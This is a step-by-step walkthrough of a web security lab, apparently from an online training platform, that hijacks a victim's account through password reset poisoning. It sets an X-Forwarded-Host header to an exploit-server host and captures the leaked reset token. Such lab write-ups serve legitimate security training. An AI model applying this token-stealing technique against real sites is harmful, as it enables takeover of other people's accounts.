Lab Scenario: Our mission is to investigate and exploit the password reset functionality of a simulated web application, demonstrating the risks associated with insecure implementations. Let's navigate through the solution using Burp Suite:

1. **Exploring Password Reset Functionality:**
    
    * With Burp running, investigate the password reset functionality.
        
    * Observe that a unique reset token is sent via email as part of the reset link.
        
2. **Inspecting the Reset Request:**
    
    * Send the `POST /forgot-password` request to Burp Repeater.
        
    * Notice the support for the `X-Forwarded-Host` header, enabling manipulation of the dynamically generated reset link.
        
3. **Setting Up the Exploit Server:**
    
    * Go to the exploit server and make a note of your exploit server URL.
        
4. **Manipulating the Reset Link:**
    
    * Go back to the request in Burp Repeater and add the `X-Forwarded-Host` header with your exploit server URL:
        
        ```plaintext
        makefileCopy codeX-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
        ```
        
    * Change the `username` parameter to "carlos" and send the request.
        
5. **Capturing the Reset Token:**
    
    * Go to the exploit server and open the access log. Identify the `GET /forgot-password` request containing the victim's token as a query parameter. Make a note of this token.
        
6. **Exploiting the Password Reset Link:**
    
    * Go back to your email client and copy the valid password reset link (not the one pointing to the exploit server).
        
    * Paste this link into the browser and change the value of the `temp-forgot-password-token` parameter to the stolen victim's token.
        
    * Load this URL and set a new password for Carlos's account.
        
7. **Solving the Lab:**
    
    * Log in to Carlos's account using the new password to successfully solve the lab.
